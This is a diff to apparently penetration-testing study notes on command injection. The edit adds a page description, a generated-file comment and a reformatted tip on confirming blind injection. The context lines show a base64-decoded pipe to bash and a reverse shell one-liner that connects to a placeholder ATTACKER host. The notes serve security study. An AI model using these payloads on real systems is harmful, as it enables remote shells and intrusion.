@@ -1,6 +1,11 @@
 ---
 title: "Command Injection"
+description: "CPTS study notes, workflows, and references from the vault."
 ---
+
+{/* Generated from Web/Command Injection.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
 User input reaches a shell. Chain your command with the app's using a separator.
 
@@ -31,6 +36,5 @@ echo aWQ= | base64 -d | bash
 bash -c 'bash -i >& /dev/tcp/ATTACKER/9001 0>&1'
 ```
 
-<Warning>
-Blind command injection: confirm with time delay (`; sleep 5`) or an out-of-band DNS/HTTP callback before assuming it failed.
-</Warning>
+
+> Blind command injection: confirm with time delay (`; sleep 5`) or an out-of-band DNS/HTTP callback before assuming it failed.
